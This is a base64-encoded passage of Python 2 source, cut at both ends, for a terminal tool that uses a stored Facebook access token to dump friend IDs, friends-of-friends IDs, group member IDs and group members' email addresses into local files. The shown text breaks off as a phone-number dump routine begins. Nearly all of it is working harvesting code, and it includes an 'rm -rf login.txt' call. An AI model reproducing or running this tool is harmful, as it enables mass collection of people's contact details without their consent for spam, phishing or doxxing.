m90IGZvdW5kIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQltZW51KCkNCg0KIyMjIyMgRFVNUCAjIyMjIw0KZGVmIGR1bXAoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXByaW50IGxvZ28NCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBHZXQgSUQgZnJpZW5kIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIEdldCBJRCBmcmllbmQgZnJvbSBmcmllbmQiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gR2V0IGdyb3VwIG1lbWJlciBJRCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1sxOzk3bSBHZXQgZ3JvdXAgbWVtYmVyIGVtYWlsIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS5cMDMzWzE7OTdtIEdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIEdldCBlbWFpbCBmcmllbmQiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gR2V0IGVtYWlsIGZyaWVuZCBmcm9tIGZyaWVuZCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTguXDAzM1sxOzk3bSBHZXQgYSBmcmllbmQncyBwaG9uZSBudW1iZXIiDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm05LlwwMzNbMTs5N20gR2V0IGEgZnJpZW5kJ3MgcGhvbmUgbnVtYmVyIGZyb20gZnJpZW5kIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siDQoJcHJpbnQgIuKVkSINCgljaG9vc2VfZHVtcCgpDQojLS0tLS1jaG9pY2VzDQpkZWYgY2hvb3NlX2R1bXAoKToNCgljaG9vc2VfZnJvbSA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW0+Pj4gXDAzM1sxOzk3bSIpDQoJaWYgY2hvb3NlX2Zyb20gPT0iIjoNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob29zZV9kdW1wKCkNCgllbGlmIGNob29zZV9mcm9tID09IjEiOg0KCQlmcmllbmRzX2lkKCkNCgllbGlmIGNob29zZV9mcm9tID09IjIiOg0KCQlpZF9mcm9tX2ZyaWVuZHMoKQ0KCWVsaWYgY2hvb3NlX2Zyb20gPT0iMyI6DQoJCWlkX21lbWJlcl9ncm91cCgpDQoJZWxpZiBjaG9vc2VfZnJvbSA9PSI0IjoNCgkJZW1fbWVtYmVyX2dyb3VwKCkNCgllbGlmIGNob29zZV9mcm9tID09IjUiOg0KCQlub19tZW1iZXJfZ3JvdXAoKQ0KCWVsaWYgY2hvb3NlX2Zyb20gPT0iNiI6DQoJCWVtYWlsKCkNCgllbGlmIGNob29zZV9mcm9tID09IjciOg0KCQllbWFpbF9mcm9tX2ZyaWVuZHMoKQ0KCWVsaWYgY2hvb3NlX2Zyb20gPT0iOCI6DQoJCXBob25lX251bWJlcigpDQoJZWxpZiBjaG9vc2VfZnJvbSA9PSI5IjoNCgkJcGhvbmVfbnVtYmVyX2Zyb21fZnJpZW5kcygpDQoJZWxpZiBjaG9vc2VfZnJvbSA9PSIwIjoNCgkJbWVudSgpDQoJZWxzZToNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob29zZV9kdW1wKCkNCg0KIyMjIyMgSUQgZnJpZW5kcyAjIyMjIw0KZGVmIGZyaWVuZHNfaWQoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3MubWtkaXIoJ291dCcpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCXBhc3MNCgl0cnk6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCXI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQl6PWpzb24ubG9hZHMoci50ZXh0KQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBpZCBcMDMzWzE7OTdtLi4uJykNCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiDQoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L2ZyaWVuZHNfaWQudHh0JywndycpDQoJCWZvciBhIGluIHpbJ2RhdGEnXToNCgkJCWlkZnJpZW5kcy5hcHBlbmQoYVsnaWQnXSkNCgkJCW1ha2VfYWN0aW9uLndyaXRlKGFbJ2lkJ10gKyAnXG4nKQ0KCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaWRmcmllbmRzKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIithWydpZCddKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQ0KCQltYWtlX2FjdGlvbi5jbG9zZSgpDQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJw0KCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIElEIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihpZGZyaWVuZHMpKQ0KCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpDQoJCW9zLnJlbmFtZSgnb3V0L2ZyaWVuZHNfaWQudHh0Jywnb3V0LycrZG9uZSkNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6DQoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiINCgkJZXhpdCgpDQoNCiMjIyMjIElEIEZST00gRlJJRU5EUyAjIyMjIw0KZGVmIGlkX2Zyb21fZnJpZW5kcygpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjAxKQ0KCQlsb2dpbigpDQoJdHJ5Og0KCQlvcy5ta2Rpcignb3V0JykNCglleGNlcHQgT1NFcnJvcjoNCgkJcGFzcw0KCXRyeToNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBmcmllbmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpDQoJCXRyeToNCgkJCXNlYXQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCQlvcCA9IGpzb24ubG9hZHMoc2VhdC50ZXh0KQ0KCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiDQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJZHVtcCgpDQoJCXI9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDAwKSZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikNCgkJej1qc29uLmxvYWRzKHIudGV4dCkNCgkJbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQltYWtlX2FjdGlvbiA9IG9wZW4oJ291dC9mcmllbmRzX2lkX2Zyb21fZnJpZW5kcy50eHQnLCd3JykNCgkJZm9yIGEgaW4gelsnZnJpZW5kcyddWydkYXRhJ106DQoJCQlpZGZyb21mcmllbmRzLmFwcGVuZChhWydpZCddKQ0KCQkJbWFrZV9hY3Rpb24ud3JpdGUoYVsnaWQnXSArICdcbicpDQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyb21mcmllbmRzKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIithWydpZCddKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQ0KCQltYWtlX2FjdGlvbi5jbG9zZSgpDQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJw0KCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIElEIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihpZGZyb21mcmllbmRzKSkNCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQ0KCQlvcy5yZW5hbWUoJ291dC9mcmllbmRzX2lkX2Zyb21fZnJpZW5kcy50eHQnLCdvdXQvJytkb25lKQ0KCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIg0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIg0KCQlleGl0KCkNCg0KIyMjIyMgSUQgRlJPTSBHUk9VUCBNRU1CRVIgIyMjIyMNCmRlZiBpZF9tZW1iZXJfZ3JvdXAoKToNCgl0cnk6DQoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMC4wMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3MubWtkaXIoJ291dCcpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCXBhc3MNCgl0cnk6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpDQoJCXRyeToNCgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQ0KCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10NCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiDQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJZHVtcCgpDQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBncm91cCBtZW1iZXIgaWQgXDAzM1sxOzk3bS4uLicpDQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCQltYWtlX2FjdGlvbiA9IG9wZW4oJ291dC9tZW1iZXJfZ3JvdXAudHh0JywndycpDQoJCXJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZCsnL21lbWJlcnM/ZmllbGRzPW5hbWUsaWQmbGltaXQ9OTk5OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlzPWpzb24ubG9hZHMocmUudGV4dCkNCgkJZm9yIGEgaW4gc1snZGF0YSddOg0KCQkJbWVtYmVyX2lkLmFwcGVuZChhWydpZCddKQ0KCQkJbWFrZV9hY3Rpb24ud3JpdGUoYVsnaWQnXSArICdcbicpDQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihtZW1iZXJfaWQpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK2FbJ2lkJ10pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpDQoJCW1ha2VfYWN0aW9uLmNsb3NlKCkNCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgaWQgXDAzM1sxOzk3bS4uLi4nDQoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKG1lbWJlcl9pZCkpDQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikNCgkJb3MucmVuYW1lKCdvdXQvbWVtYmVyX2dyb3VwLnR4dCcsJ291dC8nK2RvbmUpDQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IEtleUVycm9yOg0KCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpDQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpDQoJCWR1bXAoKQ0KCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iDQoJCWV4aXQoKQ0KDQojIyMjIyBFTUFJTCBGUk9NIGdyb3VwICMjIyMjDQpkZWYgZW1fbWVtYmVyX2dyb3VwKCk6DQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQ0KCQl0cnk6DQoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkNCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIg0KCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCWR1bXAoKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGVtYWlsIFwwMzNbMTs5N20uLi4nKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJbWFrZV9hY3Rpb24gPSBvcGVuKCdvdXQvZW1fbWVtYmVyX2dyb3VwLnR4dCcsJ3cnKQ0KCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJcz1qc29uLmxvYWRzKHJlLnRleHQpDQoJCWZvciBhIGluIHNbJ2RhdGEnXToNCgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJdHJ5Og0KCQkJCWVtbWVtLmFwcGVuZCh6WydlbWFpbCddKQ0KCQkJCW1ha2VfYWN0aW9uLndyaXRlKHpbJ2VtYWlsJ10gKyAnXG4nKQ0KCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGVtbWVtKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6WydlbWFpbCddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQ0KCQkJZXhjZXB0IEtleUVycm9yOg0KCQkJCXBhc3MNCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQ0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCINCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgZW1haWwgZnJvbSBtZW1iZXIgZ3JvdXAgXDAzM1sxOzk3bS4uLi4nDQoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgRW1haWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGVtbWVtKSkNCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQ0KCQlvcy5yZW5hbWUoJ291dC9lbV9tZW1iZXJfZ3JvdXAudHh0Jywnb3V0LycrZG9uZSkNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSINCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6DQoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQ0KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQlkdW1wKCkNCglleGNlcHQgS2V5RXJyb3I6DQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykNCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJZHVtcCgpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiINCgkJZXhpdCgpDQoNCiMjIyMjIFBIT05FIE5VTUJFUiBGUk9NIEdST1VQICMjIyMjDQpkZWYgbm9fbWVtYmVyX2dyb3VwKCk6DQoJdHJ5Og0KCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIg0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJCWxvZ2luKCkNCgl0cnk6DQoJCW9zLm1rZGlyKCdvdXQnKQ0KCWV4Y2VwdCBPU0Vycm9yOg0KCQlwYXNzDQoJdHJ5Og0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZD1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQ0KCQl0cnk6DQoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkNCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIg0KCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJCWR1bXAoKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIHBob25lIG51bWJlciBcMDMzWzE7OTdtLi4uJykNCgkJcH